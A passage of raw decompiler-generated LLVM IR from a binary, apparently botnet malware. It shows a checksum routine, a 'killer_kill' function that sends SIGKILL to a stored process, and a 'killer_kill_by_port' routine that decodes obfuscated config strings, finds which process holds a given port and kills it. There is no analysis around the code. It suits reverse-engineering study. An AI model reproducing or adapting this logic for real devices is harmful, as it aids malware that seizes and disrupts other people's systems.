  br i1 %v8_de1c, label %dec_label_pc_de0c, label %dec_label_pc_de20.loopexit

dec_label_pc_de20.loopexit:                       ; preds = %dec_label_pc_de0c
  br label %dec_label_pc_de20

dec_label_pc_de20:                                ; preds = %dec_label_pc_de20.loopexit, %entry
  %v1_de2c = phi i32 [ %v2_de18, %dec_label_pc_de20.loopexit ], [ 0, %entry ]
  %v0_de20 = phi i32 [ %v1_de0c, %dec_label_pc_de20.loopexit ], [ %arg3, %entry ]
  %v7_de20 = icmp eq i32 %v0_de20, 1
  br i1 %v7_de20, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_de20
  br label %bb19

bb:                                               ; preds = %dec_label_pc_de20
  %v1_de24 = load i32, i32* @r1, align 4
  %v2_de24 = inttoptr i32 %v1_de24 to i8*
  %v3_de24 = load i8, i8* %v2_de24, align 1
  %v4_de24 = zext i8 %v3_de24 to i32
  %v3_de2c = add i32 %v4_de24, %v1_de2c
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_de54 = phi i32 [ %v1_de2c, %.thread ], [ %v3_de2c, %bb ]
  %v0_de34 = mul i32 %v3_ddf8, 65536
  %v3_de34 = udiv i32 %v0_de34, 65536
  %v3_de38 = urem i32 %v3_ddfc, 65536
  %v4_de40 = udiv i32 %v3_ddf8, 65536
  %v2_de3c = add nuw nsw i32 %v3_de38, %v4_de40
  %v5_de40 = add nuw nsw i32 %v2_de3c, %v3_de34
  %v1_de44 = add i32 %arg1, 9
  %v2_de44 = inttoptr i32 %v1_de44 to i8*
  %v3_de44 = load i8, i8* %v2_de44, align 1
  %v4_de44 = zext i8 %v3_de44 to i32
  %v4_de48 = udiv i32 %v3_ddfc, 65536
  %v3_de50 = mul nuw nsw i32 %v4_de44, 256
  %v5_de48 = add i32 %v4_de48, %arg2
  %v2_de4c = add i32 %v5_de48, %v1_de54
  %v2_de54 = add i32 %v2_de4c, %v5_de40
  %v2_de58 = add i32 %v2_de54, %v3_de50
  %tmp = icmp ult i32 %v2_de58, 65536
  br i1 %tmp, label %dec_label_pc_de78, label %dec_label_pc_de64

dec_label_pc_de64:                                ; preds = %bb19, %dec_label_pc_de64
  %v2_de6c5 = phi i32 [ %v2_de6c, %dec_label_pc_de64 ], [ %v2_de58, %bb19 ]
  %v3_de706.in = phi i32 [ %v2_de6c, %dec_label_pc_de64 ], [ %v2_de58, %bb19 ]
  %v3_de706 = udiv i32 %v3_de706.in, 65536
  %v3_de68 = urem i32 %v2_de6c5, 65536
  %v2_de6c = add nuw nsw i32 %v3_de68, %v3_de706
  %tmp20 = icmp ult i32 %v2_de6c, 65536
  br i1 %tmp20, label %dec_label_pc_de78.loopexit, label %dec_label_pc_de64

dec_label_pc_de78.loopexit:                       ; preds = %dec_label_pc_de64
  br label %dec_label_pc_de78

dec_label_pc_de78:                                ; preds = %dec_label_pc_de78.loopexit, %bb19
  %v0_de78 = phi i32 [ %v2_de6c, %dec_label_pc_de78.loopexit ], [ %v2_de58, %bb19 ]
  %v1_de78 = urem i32 %v0_de78, 65536
  %v3_de80 = xor i32 %v1_de78, 65535
  ret i32 %v3_de80

; uselistorder directives
  uselistorder i32 %v2_de6c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_de58, { 3, 0, 2, 1 }
  uselistorder i32 %v1_de2c, { 1, 0 }
  uselistorder i32 %v5_de10, { 1, 0 }
  uselistorder i32 %v0_de10, { 1, 0 }
  uselistorder i32 %v3_ddf8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_de64, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_de0c, { 1, 0 }
}

define i32 @killer_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_de98 = load i32, i32* @global_var_2359c.103, align 4
  %v2_dea0 = call i32 @kill(i32 %v2_de98, i32 9)
  ret i32 %v2_dea0
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_deb4 = load i32, i32* @r4, align 4
  %v6_deb4 = load i32, i32* @r5, align 4
  %v9_deb4 = load i32, i32* @r6, align 4
  %v12_deb4 = load i32, i32* @r7, align 4
  %v15_deb4 = load i32, i32* @r8, align 4
  %v18_deb4 = load i32, i32* @sb, align 4
  %v21_deb4 = load i32, i32* @sl, align 4
  %v24_deb4 = load i32, i32* @fp, align 4
  %v27_deb4 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_ded0 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_ded0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_defc = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_defc, i32* @fp, align 4
  %v4_df08 = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_df0c = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_df0c, i32* @sl, align 4
  %v0_df10 = load i32, i32* @r5, align 4
  %v3_df1c = bitcast i32* %stack_var_-8777 to i8*
  %v4_df1c = call i32 @__GI_memset(i8* %v3_df1c, i32 %v0_df10, i32 4096)
  %v0_df24 = load i32, i32* @r5, align 4
  %v3_df30 = bitcast i32* %stack_var_-4681 to i8*
  %v4_df30 = call i32 @__GI_memset(i8* %v3_df30, i32 %v0_df24, i32 4096)
  %v2_df34 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_df34, i32* @sb, align 4
  %v0_df38 = load i32, i32* %r4.global-to-local, align 4
  %v3_df38 = udiv i32 %v0_df38, 256
  %v1_df3c = urem i32 %v0_df38, 256
  store i32 %v1_df3c, i32* @r4, align 4
  %v3_df4c = trunc i32 %v3_df38 to i8
  %v4_df4c = call i32 @util_itoa(i8 %v3_df4c, i32 16, i32 %v2_df34)
  %v2_df54 = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_df58 = icmp eq i32 %v2_df54, 2
  br i1 %v7_df58, label %dec_label_pc_e404, label %dec_label_pc_df60

dec_label_pc_df60:                                ; preds = %entry, %dec_label_pc_e404
  %v1_df64 = call i32 @table_unlock_val(i32 6)
  %v1_df6c = call i32 @table_unlock_val(i32 7)
  %v1_df74 = call i32 @table_unlock_val(i32 8)
  %v1_df7c = call i32 @table_unlock_val(i32 9)
  %v0_df80 = load i32, i32* @r5, align 4
  %v2_df88 = inttoptr i32 %v0_df80 to i32*
  %v3_df88 = call i32 @table_retrieve_val(i32 9, i32* %v2_df88)
  %v0_df8c = load i32, i32* @r5, align 4
  %v2_df90 = call i32 @__libc_open(i32 %v3_df88, i32 %v0_df8c)
  %v7_df94 = icmp eq i32 %v2_df90, -1
  store i32 %v2_df90, i32* @r8, align 4
  br i1 %v7_df94, label %bb, label %dec_label_pc_dfa4.preheader

bb:                                               ; preds = %dec_label_pc_df60
  %v1_df9c = load i32, i32* @r5, align 4
  store i32 %v1_df9c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e3c4

dec_label_pc_dfa4.preheader:                      ; preds = %dec_label_pc_df60
  %v4_dfb057 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v2_df90)
  %v2_dfb459 = icmp eq i32 %v4_dfb057, 0
  br i1 %v2_dfb459, label %dec_label_pc_e13c.loopexit, label %dec_label_pc_dfbc.lr.ph

dec_label_pc_dfbc.lr.ph:                          ; preds = %dec_label_pc_dfa4.preheader
  %v2_e004 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_dfbc

dec_label_pc_dfbc:                                ; preds = %dec_label_pc_dfbc.lr.ph, %dec_label_pc_dfa4.backedge
  %v3_dfc0 = load i8, i8* %stack_var_-585, align 1
  %v4_dfc0 = sext i8 %v3_dfc0 to i32
  store i32 %v4_dfc0, i32* @r3, align 4
  %v2_dfc4 = icmp eq i8 %v3_dfc0, 0
  br i1 %v2_dfc4, label %bb134, label %bb133

bb133:                                            ; preds = %dec_label_pc_dfbc
  %v8_dfc8 = icmp eq i8 %v3_dfc0, 58
  br i1 %v8_dfc8, label %.thread8, label %dec_label_pc_dfdc

.thread8:                                         ; preds = %bb133
  br label %dec_label_pc_dff4

bb134:                                            ; preds = %dec_label_pc_dfbc
  br label %dec_label_pc_dff4

dec_label_pc_dfdc:                                ; preds = %bb133
  %v1_dfe4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %bb135, %dec_label_pc_dfdc
  %v0_dfe0 = phi i32 [ %v1_dfe0, %bb135 ], [ 0, %dec_label_pc_dfdc ]
  %v1_dfe0 = add i32 %v0_dfe0, 1
  %v2_dfe4 = add i32 %v1_dfe0, %v1_dfe4.pre
  %v3_dfe4 = inttoptr i32 %v2_dfe4 to i8*
  %v4_dfe4 = load i8, i8* %v3_dfe4, align 1
  %v6_dfe4 = zext i8 %v4_dfe4 to i32
  store i32 %v6_dfe4, i32* @r3, align 4
  %v2_dfe8 = icmp eq i8 %v4_dfe4, 0
  br i1 %v2_dfe8, label %dec_label_pc_dff4, label %bb135

bb135:                                            ; preds = %dec_label_pc_dfe0
  %v8_dfec = icmp eq i8 %v4_dfe4, 58
  br i1 %v8_dfec, label %dec_label_pc_dff4, label %dec_label_pc_dfe0

dec_label_pc_dff4:                                ; preds = %dec_label_pc_dfe0, %bb135, %bb134, %.thread8
  %v1_e020 = phi i32 [ 0, %.thread8 ], [ 0, %bb134 ], [ %v1_dfe0, %bb135 ], [ %v1_dfe0, %dec_label_pc_dfe0 ]
  %v0_dff4 = phi i32 [ %v4_dfc0, %.thread8 ], [ %v4_dfc0, %bb134 ], [ %v6_dfe4, %bb135 ], [ %v6_dfe4, %dec_label_pc_dfe0 ]
  %v2_dff4 = icmp eq i32 %v0_dff4, 0
  br i1 %v2_dff4, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_dffc

dec_label_pc_dfa4.backedge:                       ; preds = %dec_label_pc_dff4, %dec_label_pc_e0c4, %dec_label_pc_e110, %dec_label_pc_e040
  %v0_dfac = load i32, i32* @r8, align 4
  %v4_dfb0 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_dfac)
  %v2_dfb4 = icmp eq i32 %v4_dfb0, 0
  br i1 %v2_dfb4, label %dec_label_pc_e13c.loopexit, label %dec_label_pc_dfbc

dec_label_pc_dffc:                                ; preds = %dec_label_pc_dff4
  %v1_e000 = add i32 %v1_e020, 2
  %v2_e008 = add i32 %v1_e000, %v2_e004
  %v1_e00c = add i32 %v2_e008, -545
  %v2_e00c = inttoptr i32 %v1_e00c to i8*
  %v3_e00c = load i8, i8* %v2_e00c, align 1
  %v2_e010 = icmp eq i8 %v3_e00c, 0
  br i1 %v2_e010, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_dffc
  %v8_e014 = icmp eq i8 %v3_e00c, 32
  br i1 %v8_e014, label %.thread13, label %dec_label_pc_e020

.thread13:                                        ; preds = %bb136
  store i32 %v1_e000, i32* @r5, align 4
  br label %dec_label_pc_e040

bb137:                                            ; preds = %dec_label_pc_dffc
  store i32 %v1_e000, i32* @r5, align 4
  br label %dec_label_pc_e040

dec_label_pc_e020:                                ; preds = %bb136
  %v0_e020 = load i32, i32* @r6, align 4
  %v2_e020 = add i32 %v0_e020, %v1_e020
  br label %dec_label_pc_e028

dec_label_pc_e028:                                ; preds = %bb138, %dec_label_pc_e020
  %v0_e03416 = phi i32 [ %v1_e034, %bb138 ], [ %v1_e000, %dec_label_pc_e020 ]
  %v0_e03818 = phi i32 [ %v1_e038, %bb138 ], [ %v2_e020, %dec_label_pc_e020 ]
  %v1_e028 = add i32 %v0_e03818, 3
  %v2_e028 = inttoptr i32 %v1_e028 to i8*
  %v3_e028 = load i8, i8* %v2_e028, align 1
  %v2_e02c = icmp eq i8 %v3_e028, 0
  br i1 %v2_e02c, label %.thread15, label %bb138

.thread15:                                        ; preds = %dec_label_pc_e028
  %v1_e03417 = add i32 %v0_e03416, 1
  store i32 %v1_e03417, i32* @r5, align 4
  br label %dec_label_pc_e040

bb138:                                            ; preds = %dec_label_pc_e028
  %v8_e030 = icmp eq i8 %v3_e028, 32
  %v1_e034 = add i32 %v0_e03416, 1
  store i32 %v1_e034, i32* @r5, align 4
  %v1_e038 = add i32 %v0_e03818, 1
  br i1 %v8_e030, label %dec_label_pc_e040, label %dec_label_pc_e028

dec_label_pc_e040:                                ; preds = %bb138, %bb137, %.thread15, %.thread13
  %v1_e04c = phi i32 [ %v1_e03417, %.thread15 ], [ %v1_e000, %.thread13 ], [ %v1_e000, %bb137 ], [ %v1_e034, %bb138 ]
  %v0_e040 = load i32, i32* @r6, align 4
  %v2_e040 = add i32 %v0_e040, %v1_e000
  store i32 %v2_e040, i32* @r4, align 4
  %v2_e04c = add i32 %v1_e04c, %v2_e004
  store i32 0, i32* @r7, align 4
  %v3_e054 = add i32 %v2_e04c, -545
  %v4_e054 = inttoptr i32 %v3_e054 to i8*
  store i8 0, i8* %v4_e054, align 1
  %v0_e058 = load i32, i32* @r4, align 4
  %v1_e05c = inttoptr i32 %v0_e058 to i8*
  %v2_e05c = call i32 @util_strlen(i8* %v1_e05c)
  store i32 %v2_e05c, i32* @r1, align 4
  %v0_e068 = load i32, i32* @r4, align 4
  %v3_e06c = inttoptr i32 %v0_e068 to i8*
  %v4_e06c = call i32 @util_stristr(i8* %v3_e06c, i32 %v2_e05c, i32 %v2_df34)
  %v7_e070 = icmp eq i32 %v4_e06c, -1
  br i1 %v7_e070, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_e08c.preheader

dec_label_pc_e08c.preheader:                      ; preds = %dec_label_pc_e040
  %v1_e074 = load i32, i32* @r7, align 4
  %v1_e078 = load i32, i32* @r6, align 4
  %v2_e078 = load i32, i32* @r5, align 4
  %v3_e078 = add i32 %v2_e078, %v1_e078
  store i32 %v1_e074, i32* @lr, align 4
  %v1_e08c49 = add i32 %v3_e078, 2
  %v2_e08c50 = inttoptr i32 %v1_e08c49 to i8*
  %v3_e08c51 = load i8, i8* %v2_e08c50, align 1
  %v4_e08c52 = zext i8 %v3_e08c51 to i32
  store i32 %v4_e08c52, i32* @r3, align 4
  %v2_e09053 = icmp eq i8 %v3_e08c51, 0
  %v1_e09455 = add i32 %v2_e078, 2
  br i1 %v2_e09053, label %dec_label_pc_e0c4, label %dec_label_pc_e09c

dec_label_pc_e09c:                                ; preds = %dec_label_pc_e08c.preheader, %dec_label_pc_e08c.backedge
  %v0_e0c484 = phi i32 [ %v0_e0c482, %dec_label_pc_e08c.backedge ], [ %v1_e074, %dec_label_pc_e08c.preheader ]
  %v0_e0ac.pr = phi i32 [ %v0_e0ac.pr71, %dec_label_pc_e08c.backedge ], [ %v1_e074, %dec_label_pc_e08c.preheader ]
  %v0_e3d8 = phi i32 [ %v0_e3d874, %dec_label_pc_e08c.backedge ], [ %v1_e074, %dec_label_pc_e08c.preheader ]
  %v0_e09479 = phi i32 [ %v1_e094, %dec_label_pc_e08c.backedge ], [ %v1_e09455, %dec_label_pc_e08c.preheader ]
  %v0_e0bc = phi i32 [ %v0_e08c, %dec_label_pc_e08c.backedge ], [ %v3_e078, %dec_label_pc_e08c.preheader ]
  %v1_e0a0 = phi i32 [ %v4_e08c, %dec_label_pc_e08c.backedge ], [ %v4_e08c52, %dec_label_pc_e08c.preheader ]
  %v7_e09c = icmp eq i32 %v1_e0a0, 9
  br i1 %v7_e09c, label %bb140, label %bb139

bb139:                                            ; preds = %dec_label_pc_e09c
  %v8_e0a0 = icmp eq i32 %v1_e0a0, 32
  br i1 %v8_e0a0, label %.thread27, label %dec_label_pc_e0ac

.thread27:                                        ; preds = %bb139
  br label %dec_label_pc_e0b8

bb140:                                            ; preds = %dec_label_pc_e09c
  br label %dec_label_pc_e0b8

dec_label_pc_e0ac:                                ; preds = %bb139
  %v7_e0ac = icmp eq i32 %v0_e0ac.pr, 1
  br i1 %v7_e0ac, label %dec_label_pc_e3d8, label %dec_label_pc_e0b4

dec_label_pc_e0b4:                                ; preds = %dec_label_pc_e3d8, %dec_label_pc_e0ac
  %v0_e0b876 = phi i32 [ %v1_e3d8, %dec_label_pc_e3d8 ], [ %v0_e3d8, %dec_label_pc_e0ac ]
  br label %dec_label_pc_e0b8

dec_label_pc_e0b8:                                ; preds = %bb140, %.thread27, %dec_label_pc_e0b4
  %v0_e0b8 = phi i32 [ %v0_e3d8, %.thread27 ], [ %v0_e3d8, %bb140 ], [ %v0_e0b876, %dec_label_pc_e0b4 ]
  %v0_e0ac.pr72 = phi i32 [ 1, %.thread27 ], [ 1, %bb140 ], [ 0, %dec_label_pc_e0b4 ]
  %v7_e0c0 = icmp sgt i32 %v0_e0b8, 6
  br i1 %v7_e0c0, label %dec_label_pc_e0c4, label %dec_label_pc_e08c.backedge

dec_label_pc_e0c4:                                ; preds = %dec_label_pc_e08c.backedge, %dec_label_pc_e0b8, %dec_label_pc_e08c.preheader
  %v1_e114 = phi i32 [ %v1_e09455, %dec_label_pc_e08c.preheader ], [ %v1_e094, %dec_label_pc_e08c.backedge ], [ %v0_e09479, %dec_label_pc_e0b8 ]
  %v0_e0c4 = phi i32 [ %v1_e074, %dec_label_pc_e08c.preheader ], [ %v0_e0c482, %dec_label_pc_e08c.backedge ], [ %v0_e0c484, %dec_label_pc_e0b8 ]
  %v2_e0c4 = icmp eq i32 %v0_e0c4, 0
  br i1 %v2_e0c4, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_e0d0

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_e0c4
  %v2_e0d8 = add i32 %v1_e114, %v2_e004
  %v1_e0dc = add i32 %v2_e0d8, -545
  %v2_e0dc = inttoptr i32 %v1_e0dc to i8*
  %v3_e0dc = load i8, i8* %v2_e0dc, align 1
  %v2_e0e0 = icmp eq i8 %v3_e0dc, 0
  br i1 %v2_e0e0, label %dec_label_pc_e110, label %bb141

bb141:                                            ; preds = %dec_label_pc_e0d0
  %v8_e0e4 = icmp eq i8 %v3_e0dc, 32
  br i1 %v8_e0e4, label %dec_label_pc_e110, label %dec_label_pc_e0ec

dec_label_pc_e0ec:                                ; preds = %bb141
  %v2_e0ec = add i32 %v1_e114, %v1_e078
  br label %dec_label_pc_e0f0

dec_label_pc_e0f0:                                ; preds = %bb142, %dec_label_pc_e0ec
  %v0_e0fc30 = phi i32 [ %v1_e0fc, %bb142 ], [ %v1_e114, %dec_label_pc_e0ec ]
  %v0_e0f0 = phi i32 [ %v1_e0f0, %bb142 ], [ %v2_e0ec, %dec_label_pc_e0ec ]
  %v1_e0f0 = add i32 %v0_e0f0, 1
  %v2_e0f0 = inttoptr i32 %v1_e0f0 to i8*
  %v3_e0f0 = load i8, i8* %v2_e0f0, align 1
  %v2_e0f4 = icmp eq i8 %v3_e0f0, 0
  br i1 %v2_e0f4, label %.thread29, label %bb142

.thread29:                                        ; preds = %dec_label_pc_e0f0
  %v1_e0fc31 = add i32 %v0_e0fc30, 1
  br label %dec_label_pc_e104

bb142:                                            ; preds = %dec_label_pc_e0f0
  %v8_e0f8 = icmp eq i8 %v3_e0f0, 32
  %v1_e0fc = add i32 %v0_e0fc30, 1
  br i1 %v8_e0f8, label %dec_label_pc_e104, label %dec_label_pc_e0f0

dec_label_pc_e104:                                ; preds = %bb142, %.thread29
  %v1_e10c = phi i32 [ %v1_e0fc31, %.thread29 ], [ %v1_e0fc, %bb142 ]
  %v2_e10c = add i32 %v1_e10c, %v2_e004
  br label %dec_label_pc_e110

dec_label_pc_e110:                                ; preds = %dec_label_pc_e0d0, %bb141, %dec_label_pc_e104
  %v2_e11c = phi i32 [ %v2_e0d8, %dec_label_pc_e0d0 ], [ %v2_e0d8, %bb141 ], [ %v2_e10c, %dec_label_pc_e104 ]
  %v2_e114 = add i32 %v1_e114, %v1_e078
  store i32 %v2_e114, i32* @r4, align 4
  %v3_e11c = add i32 %v2_e11c, -545
  %v4_e11c = inttoptr i32 %v3_e11c to i8*
  store i8 0, i8* %v4_e11c, align 1
  %v1_e120 = inttoptr i32 %v2_e114 to i8*
  %v2_e120 = call i32 @util_strlen(i8* %v1_e120)
  %v8_e128 = icmp sgt i32 %v2_e120, 15
  br i1 %v8_e128, label %dec_label_pc_dfa4.backedge, label %dec_label_pc_e12c

dec_label_pc_e12c:                                ; preds = %dec_label_pc_e110
  %v0_e130 = load i32, i32* @r4, align 4
  %v2_e134 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_e134, i32* @r0, align 4
  %v2_e138 = bitcast i32* %stack_var_-56 to i8*
  %v3_e138 = call i32 @util_strcpy(i8* %v2_e138, i32 %v0_e130)
  br label %dec_label_pc_e13c

dec_label_pc_e13c.loopexit:                       ; preds = %dec_label_pc_dfa4.backedge, %dec_label_pc_dfa4.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre100 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_e13c

dec_label_pc_e13c:                                ; preds = %dec_label_pc_e13c.loopexit, %dec_label_pc_e12c
  %v1_e14c.pre-phi = phi i8* [ %.pre100, %dec_label_pc_e13c.loopexit ], [ %v2_e138, %dec_label_pc_e12c ]
  %v2_e148.pre-phi = phi i32 [ %.pre, %dec_label_pc_e13c.loopexit ], [ %v2_e134, %dec_label_pc_e12c ]
  %v0_e13c = load i32, i32* @r8, align 4
  %v1_e140 = call i32 @__GI___libc_close(i32 %v0_e13c)
  %v2_e14c = call i32 @util_strlen(i8* %v1_e14c.pre-phi)
  store i32 %v2_e14c, i32* @r4, align 4
  %v2_e150 = icmp eq i32 %v2_e14c, 0
  br i1 %v2_e150, label %dec_label_pc_e3a8, label %dec_label_pc_e15c

dec_label_pc_e15c:                                ; preds = %dec_label_pc_e13c
  %v3_e164 = call i32 @table_retrieve_val(i32 6, i32* null)
  %v1_e168 = call i32 @__GI_opendir(i32 %v3_e164)
  store i32 %v1_e168, i32* @sb, align 4
  %v2_e16c = icmp eq i32 %v1_e168, 0
  br i1 %v2_e16c, label %dec_label_pc_e39c, label %dec_label_pc_e17c.preheader

dec_label_pc_e17c.preheader:                      ; preds = %dec_label_pc_e15c
  store i32 0, i32* @r5, align 4
  %v1_e18044 = inttoptr i32 %v1_e168 to i32*
  %v2_e18045 = call i32 @__GI_readdir(i32* %v1_e18044)
  %v2_e18447 = icmp eq i32 %v2_e18045, 0
  br i1 %v2_e18447, label %dec_label_pc_e390, label %dec_label_pc_e18c.preheader

dec_label_pc_e17c.loopexit:                       ; preds = %dec_label_pc_e194, %dec_label_pc_e1a4, %dec_label_pc_e210
  %v0_e17c = load i32, i32* @sb, align 4
  %v1_e180 = inttoptr i32 %v0_e17c to i32*
  %v2_e180 = call i32 @__GI_readdir(i32* %v1_e180)
  %v2_e184 = icmp eq i32 %v2_e180, 0
  br i1 %v2_e184, label %dec_label_pc_e390, label %dec_label_pc_e18c.preheader

dec_label_pc_e18c.preheader:                      ; preds = %dec_label_pc_e17c.preheader, %dec_label_pc_e17c.loopexit
  %v0_e19492 = phi i32 [ %v2_e180, %dec_label_pc_e17c.loopexit ], [ %v2_e18045, %dec_label_pc_e17c.preheader ]
  br label %dec_label_pc_e18c

dec_label_pc_e18c:                                ; preds = %dec_label_pc_e18c.preheader, %dec_label_pc_e378
  %v0_e1ac = phi i32 [ %v0_e19492, %dec_label_pc_e18c.preheader ], [ %v2_e384, %dec_label_pc_e378 ]
  %v0_e18c = load i32, i32* @r5, align 4
  %v2_e18c = icmp eq i32 %v0_e18c, 0
  br i1 %v2_e18c, label %dec_label_pc_e194, label %dec_label_pc_e390

dec_label_pc_e194:                                ; preds = %dec_label_pc_e18c
  %v1_e194 = add i32 %v0_e1ac, 11
  %v2_e194 = inttoptr i32 %v1_e194 to i8*
  %v3_e194 = load i8, i8* %v2_e194, align 1
  %v4_e194 = zext i8 %v3_e194 to i32
  %v1_e198 = add nsw i32 %v4_e194, -48
  %tmp = icmp ugt i32 %v1_e198, 9
  br i1 %tmp, label %dec_label_pc_e17c.loopexit, label %dec_label_pc_e1a4

dec_label_pc_e1a4:                                ; preds = %dec_label_pc_e194
  store i32 %v1_e194, i32* @r7, align 4
  %v3_e1b0 = call i32 @table_retrieve_val(i32 6, i32* null)
  store i32 %v2_df0c, i32* @r0, align 4
  %v3_e1bc = call i32 @util_strcpy(i8* %v3_df30, i32 %v3_e1b0)
  %v2_e1c4 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e1c8 = load i32, i32* @r7, align 4
  %v1_e1cc = load i32, i32* @sl, align 4
  %v2_e1cc = add i32 %v1_e1cc, %v2_e1c4
  store i32 %v2_e1cc, i32* @r0, align 4
  %v2_e1d0 = inttoptr i32 %v2_e1cc to i8*
  %v3_e1d0 = call i32 @util_strcpy(i8* %v2_e1d0, i32 %v0_e1c8)
  %v2_e1d8 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e1dc = load i32, i32* @r5, align 4
  store i32 %v2_e1d8, i32* @r4, align 4
  %v2_e1e8 = inttoptr i32 %v0_e1dc to i32*
  %v3_e1e8 = call i32 @table_retrieve_val(i32 7, i32* %v2_e1e8)
  %v0_e1f0 = load i32, i32* @r4, align 4
  %v1_e1f0 = load i32, i32* @sl, align 4
  %v2_e1f0 = add i32 %v1_e1f0, %v0_e1f0
  store i32 %v2_e1f0, i32* @r0, align 4
  %v2_e1f4 = inttoptr i32 %v2_e1f0 to i8*
  %v3_e1f4 = call i32 @util_strcpy(i8* %v2_e1f4, i32 %v3_e1e8)
  %v3_e204 = call i32 @readlink(i32 %v2_df0c, i32 %v2_defc, i32 4096)
  %v7_e208 = icmp eq i32 %v3_e204, -1
  br i1 %v7_e208, label %dec_label_pc_e17c.loopexit, label %dec_label_pc_e210

dec_label_pc_e210:                                ; preds = %dec_label_pc_e1a4
  %v0_e210 = load i32, i32* @r5, align 4
  %v2_e218 = inttoptr i32 %v0_e210 to i32*
  %v3_e218 = call i32 @table_retrieve_val(i32 6, i32* %v2_e218)
  store i32 %v2_df0c, i32* @r0, align 4
  %v3_e224 = call i32 @util_strcpy(i8* %v3_df30, i32 %v3_e218)
  %v2_e22c = call i32 @util_strlen(i8* %v3_df30)
  %v0_e230 = load i32, i32* @r7, align 4
  %v1_e234 = load i32, i32* @sl, align 4
  %v2_e234 = add i32 %v1_e234, %v2_e22c
  store i32 %v2_e234, i32* @r0, align 4
  %v2_e238 = inttoptr i32 %v2_e234 to i8*
  %v3_e238 = call i32 @util_strcpy(i8* %v2_e238, i32 %v0_e230)
  %v2_e240 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e244 = load i32, i32* @r5, align 4
  store i32 %v2_e240, i32* @r4, align 4
  %v2_e250 = inttoptr i32 %v0_e244 to i32*
  %v3_e250 = call i32 @table_retrieve_val(i32 8, i32* %v2_e250)
  %v0_e258 = load i32, i32* @r4, align 4
  %v1_e258 = load i32, i32* @sl, align 4
  %v2_e258 = add i32 %v1_e258, %v0_e258
  store i32 %v2_e258, i32* @r0, align 4
  %v2_e25c = inttoptr i32 %v2_e258 to i8*
  %v3_e25c = call i32 @util_strcpy(i8* %v2_e25c, i32 %v3_e250)
  %v1_e264 = call i32 @__GI_opendir(i32 %v2_df0c)
  store i32 %v1_e264, i32* @r8, align 4
  %v2_e268 = icmp eq i32 %v1_e264, 0
  br i1 %v2_e268, label %dec_label_pc_e17c.loopexit, label %dec_label_pc_e270.preheader

dec_label_pc_e270.preheader:                      ; preds = %dec_label_pc_e210
  %v1_e27439 = inttoptr i32 %v1_e264 to i32*
  %v2_e27440 = call i32 @__GI_readdir(i32* %v1_e27439)
  store i32 %v2_e27440, i32* @r6, align 4
  %v2_e27842 = icmp eq i32 %v2_e27440, 0
  br i1 %v2_e27842, label %dec_label_pc_e378, label %dec_label_pc_e288thread-pre-split

dec_label_pc_e270.loopexit:                       ; preds = %dec_label_pc_e290, %dec_label_pc_e328
  %v0_e270 = load i32, i32* @r8, align 4
  %v1_e274 = inttoptr i32 %v0_e270 to i32*
  %v2_e274 = call i32 @__GI_readdir(i32* %v1_e274)
  store i32 %v2_e274, i32* @r6, align 4
  %v2_e278 = icmp eq i32 %v2_e274, 0
  br i1 %v2_e278, label %dec_label_pc_e378, label %dec_label_pc_e288thread-pre-split

dec_label_pc_e288thread-pre-split:                ; preds = %dec_label_pc_e270.preheader, %dec_label_pc_e270.loopexit
  %v0_e288.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_e288

dec_label_pc_e288:                                ; preds = %dec_label_pc_e288thread-pre-split, %dec_label_pc_e350
  %v0_e288 = phi i32 [ %v0_e288.pr, %dec_label_pc_e288thread-pre-split ], [ 1, %dec_label_pc_e350 ]
  %v2_e288 = icmp eq i32 %v0_e288, 0
  br i1 %v2_e288, label %dec_label_pc_e290, label %dec_label_pc_e378

dec_label_pc_e290:                                ; preds = %dec_label_pc_e288
  %v2_e290 = call i32 @util_zero(i32 %v2_defc, i32 4096)
  %v0_e294 = load i32, i32* @r5, align 4
  %v2_e29c = inttoptr i32 %v0_e294 to i32*
  %v3_e29c = call i32 @table_retrieve_val(i32 6, i32* %v2_e29c)
  store i32 %v2_df0c, i32* @r0, align 4
  %v3_e2a8 = call i32 @util_strcpy(i8* %v3_df30, i32 %v3_e29c)
  %v2_e2b0 = call i32 @util_strlen(i8* %v3_df30)
  %v0_e2b4 = load i32, i32* @r7, align 4
